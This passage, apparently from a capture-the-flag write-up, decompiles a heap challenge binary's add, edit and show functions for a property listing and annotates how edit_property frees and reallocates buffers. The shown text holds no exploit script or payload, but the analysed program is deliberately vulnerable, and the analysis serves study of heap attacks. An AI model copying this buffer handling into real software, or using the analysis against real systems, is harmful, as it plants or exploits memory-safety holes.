</span></span><span class="line"><span class="cl">    <span class="n">pvVar2</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)((</span><span class="kt">long</span><span class="p">)</span><span class="n">property</span> <span class="o">+</span> <span class="mh">0x38</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="p">(</span><span class="kt">void</span> <span class="o">**</span><span class="p">)((</span><span class="kt">long</span><span class="p">)</span><span class="n">_property</span> <span class="o">+</span> <span class="mh">0x30</span><span class="p">)</span> <span class="o">=</span> <span class="n">pvVar2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)((</span><span class="kt">long</span><span class="p">)</span><span class="n">property</span> <span class="o">+</span> <span class="mh">0x30</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Failed to allocate memory for the comment&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                    <span class="cm">/* WARNING: Subroutine does not return */</span>
</span></span><span class="line"><span class="cl">      <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Enter the comment: &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">fgets</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">char</span> <span class="o">**</span><span class="p">)((</span><span class="kt">long</span><span class="p">)</span><span class="n">property</span> <span class="o">+</span> <span class="mh">0x30</span><span class="p">),(</span><span class="kt">int</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="n">undefined8</span> <span class="o">*</span><span class="p">)((</span><span class="kt">long</span><span class="p">)</span><span class="n">property</span> <span class="o">+</span> <span class="mh">0x38</span><span class="p">),</span><span class="n">stdin</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">lVar1</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)((</span><span class="kt">long</span><span class="p">)</span><span class="n">property</span> <span class="o">+</span> <span class="mh">0x30</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">sVar3</span> <span class="o">=</span> <span class="n">strcspn</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">char</span> <span class="o">**</span><span class="p">)((</span><span class="kt">long</span><span class="p">)</span><span class="n">property</span> <span class="o">+</span> <span class="mh">0x30</span><span class="p">),</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="p">(</span><span class="n">undefined</span> <span class="o">*</span><span class="p">)(</span><span class="n">sVar3</span> <span class="o">+</span> <span class="n">lVar1</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">local_20</span> <span class="o">!=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="cm">/* WARNING: Subroutine does not return */</span>
</span></span><span class="line"><span class="cl">    <span class="n">__stack_chk_fail</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Okay, so when we add a new property, important things that we do:</p>
<ul>
<li><code>malloc(0x40)</code> for <code>property</code> object</li>
<li>We can malloc street name with any size
<ul>
<li>And we store the given size inside the <code>property</code> object</li>
</ul>
</li>
<li>We can malloc comment with any size
<ul>
<li>And we store the given size inside the <code>property</code> object</li>
</ul>
</li>
</ul>
<h4 id="edit_property">edit_property</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">edit_property</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">void</span> <span class="o">*</span><span class="n">pvVar1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">size_t</span> <span class="n">sVar2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">long</span> <span class="n">in_FS_OFFSET</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">local_29</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">ulong</span> <span class="n">input_size</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">long</span> <span class="n">local_20</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">long</span> <span class="n">_property</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="n">local_20</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">local_29</span> <span class="o">=</span> <span class="sc">&#39;n&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">input_size</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Would you like to change the house number? [y/n]: &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">DAT_00102133</span><span class="p">,</span><span class="o">&amp;</span><span class="n">local_29</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">getchar</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">local_29</span> <span class="o">==</span> <span class="sc">&#39;y&#39;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Enter the new house number: &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">fmt_d</span><span class="p">,</span><span class="n">property</span> <span class="o">+</span> <span class="mh">0x18</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">getchar</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="n">local_29</span> <span class="o">=</span> <span class="sc">&#39;n&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Would you like to change the street? [y/n]: &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">DAT_00102133</span><span class="p">,</span><span class="o">&amp;</span><span class="n">local_29</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">getchar</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">local_29</span> <span class="o">==</span> <span class="sc">&#39;y&#39;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Enter the new street name length: &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">fmt_zu</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">getchar</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">ulong</span> <span class="o">*</span><span class="p">)(</span><span class="n">property</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">)</span> <span class="o">&lt;</span> <span class="n">input_size</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="n">free</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">void</span> <span class="o">**</span><span class="p">)(</span><span class="n">property</span> <span class="o">+</span> <span class="mh">0x20</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">      <span class="n">_property</span> <span class="o">=</span> <span class="n">property</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="n">pvVar1</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">input_size</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="o">*</span><span class="p">(</span><span class="kt">void</span> <span class="o">**</span><span class="p">)(</span><span class="n">_property</span> <span class="o">+</span> <span class="mh">0x20</span><span class="p">)</span> <span class="o">=</span> <span class="n">pvVar1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">property</span> <span class="o">+</span> <span class="mh">0x20</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Failed to allocate memory for the street name&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                    <span class="cm">/* WARNING: Subroutine does not return */</span>
</span></span><span class="line"><span class="cl">        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="p">(</span><span class="n">ulong</span> <span class="o">*</span><span class="p">)(</span><span class="n">property</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">)</span> <span class="o">=</span> <span class="n">input_size</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Enter the new street name: &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">fgets</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">char</span> <span class="o">**</span><span class="p">)(</span><span class="n">property</span> <span class="o">+</span> <span class="mh">0x20</span><span class="p">),(</span><span class="kt">int</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="n">undefined8</span> <span class="o">*</span><span class="p">)(</span><span class="n">property</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">),</span><span class="n">stdin</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">_property</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">property</span> <span class="o">+</span> <span class="mh">0x20</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">sVar2</span> <span class="o">=</span> <span class="n">strcspn</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">char</span> <span class="o">**</span><span class="p">)(</span><span class="n">property</span> <span class="o">+</span> <span class="mh">0x20</span><span class="p">),</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="p">(</span><span class="n">undefined</span> <span class="o">*</span><span class="p">)(</span><span class="n">sVar2</span> <span class="o">+</span> <span class="n">_property</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">local_29</span> <span class="o">=</span> <span class="sc">&#39;n&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Would you like to change the price of the property? [y/n]: &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">DAT_00102133</span><span class="p">,</span><span class="o">&amp;</span><span class="n">local_29</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">getchar</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">local_29</span> <span class="o">==</span> <span class="sc">&#39;y&#39;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;What is the new price of the property?: &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">fmt_lf</span><span class="p">,</span><span class="n">property</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">getchar</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="n">local_29</span> <span class="o">=</span> <span class="sc">&#39;n&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">property</span> <span class="o">+</span> <span class="mh">0x30</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Would you like to add a comment? [y/n]: &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">DAT_00102133</span><span class="p">,</span><span class="o">&amp;</span><span class="n">local_29</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">getchar</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">local_29</span> <span class="o">==</span> <span class="sc">&#39;y&#39;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="n">printf</span><span class="p">(</span><span class="s">&#34;What is the length of the comment?: &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">fmt_zu</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="n">getchar</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">      <span class="n">_property</span> <span class="o">=</span> <span class="n">property</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="n">pvVar1</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">property</span> <span class="o">+</span> <span class="mh">0x38</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="o">*</span><span class="p">(</span><span class="kt">void</span> <span class="o">**</span><span class="p">)(</span><span class="n">_property</span> <span class="o">+</span> <span class="mh">0x30</span><span class="p">)</span> <span class="o">=</span> <span class="n">pvVar1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">property</span> <span class="o">+</span> <span class="mh">0x30</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Failed to allocate memory for the comment&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                    <span class="cm">/* WARNING: Subroutine does not return */</span>
</span></span><span class="line"><span class="cl">        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Enter the comment: &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="n">fgets</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">char</span> <span class="o">**</span><span class="p">)(</span><span class="n">property</span> <span class="o">+</span> <span class="mh">0x30</span><span class="p">),(</span><span class="kt">int</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="n">undefined8</span> <span class="o">*</span><span class="p">)(</span><span class="n">property</span> <span class="o">+</span> <span class="mh">0x38</span><span class="p">),</span><span class="n">stdin</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="n">_property</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">property</span> <span class="o">+</span> <span class="mh">0x30</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="n">sVar2</span> <span class="o">=</span> <span class="n">strcspn</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">char</span> <span class="o">**</span><span class="p">)(</span><span class="n">property</span> <span class="o">+</span> <span class="mh">0x30</span><span class="p">),</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="o">*</span><span class="p">(</span><span class="n">undefined</span> <span class="o">*</span><span class="p">)(</span><span class="n">sVar2</span> <span class="o">+</span> <span class="n">_property</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Would you like to change the comment? [y/n]: &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">DAT_00102133</span><span class="p">,</span><span class="o">&amp;</span><span class="n">local_29</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">getchar</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">local_29</span> <span class="o">==</span> <span class="sc">&#39;y&#39;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Enter the new comment length: &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">fmt_zu</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="n">getchar</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">ulong</span> <span class="o">*</span><span class="p">)(</span><span class="n">property</span> <span class="o">+</span> <span class="mh">0x38</span><span class="p">)</span> <span class="o">&lt;</span> <span class="n">input_size</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">free</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">void</span> <span class="o">**</span><span class="p">)(</span><span class="n">property</span> <span class="o">+</span> <span class="mh">0x30</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">        <span class="n">_property</span> <span class="o">=</span> <span class="n">property</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">pvVar1</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">input_size</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="o">*</span><span class="p">(</span><span class="kt">void</span> <span class="o">**</span><span class="p">)(</span><span class="n">_property</span> <span class="o">+</span> <span class="mh">0x30</span><span class="p">)</span> <span class="o">=</span> <span class="n">pvVar1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">property</span> <span class="o">+</span> <span class="mh">0x30</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Failed to allocate memroy for the comment&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                    <span class="cm">/* WARNING: Subroutine does not return */</span>
</span></span><span class="line"><span class="cl">          <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="o">*</span><span class="p">(</span><span class="n">ulong</span> <span class="o">*</span><span class="p">)(</span><span class="n">property</span> <span class="o">+</span> <span class="mh">0x38</span><span class="p">)</span> <span class="o">=</span> <span class="n">input_size</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Enter the new comment: &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="n">fgets</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">char</span> <span class="o">**</span><span class="p">)(</span><span class="n">property</span> <span class="o">+</span> <span class="mh">0x30</span><span class="p">),(</span><span class="kt">int</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="n">undefined8</span> <span class="o">*</span><span class="p">)(</span><span class="n">property</span> <span class="o">+</span> <span class="mh">0x38</span><span class="p">),</span><span class="n">stdin</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="n">_property</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">property</span> <span class="o">+</span> <span class="mh">0x30</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="n">sVar2</span> <span class="o">=</span> <span class="n">strcspn</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">char</span> <span class="o">**</span><span class="p">)(</span><span class="n">property</span> <span class="o">+</span> <span class="mh">0x30</span><span class="p">),</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="o">*</span><span class="p">(</span><span class="n">undefined</span> <span class="o">*</span><span class="p">)(</span><span class="n">sVar2</span> <span class="o">+</span> <span class="n">_property</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">local_20</span> <span class="o">!=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="cm">/* WARNING: Subroutine does not return */</span>
</span></span><span class="line"><span class="cl">    <span class="n">__stack_chk_fail</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Okay, so what it do is:</p>
<ul>
<li>We can change all the metadata of property, with rules:
<ul>
<li>If the new size is smaller than the stored size, it will:
<ul>
<li>Directly replace the metadata values</li>
<li>Store the new size inside <code>property</code> object</li>
</ul>
</li>
<li>If the new size is larger, it will:
<ul>
<li>Free the chunk</li>
<li>Alloc new chunk with new size</li>
<li>Store the new size inside <code>property</code> object</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="show_property">show_property</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">show_property</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Your property info:</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;House number: %d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,(</span><span class="n">ulong</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="n">uint</span> <span class="o">*</span><span class="p">)(</span><span class="n">property</span> <span class="o">+</span> <span class="mh">0x18</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Street name: %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span><span class="o">*</span><span class="p">(</span><span class="n">undefined8</span> <span class="o">*</span><span class="p">)(</span><span class="n">property</span> <span class="o">+</span> <span class="mh">0x20</span><span class="p">));</span>
